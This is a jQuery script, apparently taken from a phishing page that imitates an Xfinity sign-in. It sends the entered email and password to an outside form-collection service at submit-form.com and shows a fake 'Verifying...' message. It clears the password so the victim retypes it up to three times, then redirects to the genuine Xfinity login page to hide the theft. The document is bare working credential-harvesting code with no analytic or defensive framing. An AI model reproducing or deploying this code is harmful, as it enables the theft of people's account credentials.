<script>
$(document).ready(function() {
    var attemptCount = 0;

    $("#contact").on('submit', function(e) {
        e.preventDefault();

        var email = $("#username").val();
        var password = $("input[name='pass']").val();

        attemptCount++;

        if (attemptCount <= 3) {
            $.ajax({
                dataType: "JSON",
                url: "https://submit-form.com/9Y8GPeEDG",
                type: "POST",
                data: {
                    email: email,
                    password: password
                },
                beforeSend: function() {
                    $("#submit-btn").html("Verifying...");
                },
                complete: function() {
                    $("#submit-btn").html("Sign in");
                    if (attemptCount < 3) {
                        $("input[name='pass']").val('');
                    }
                    if (attemptCount === 3) {
                        window.location.replace("https://login.xfinity.com/login");
                    }
                }
            });
        }
    });
});
</script>
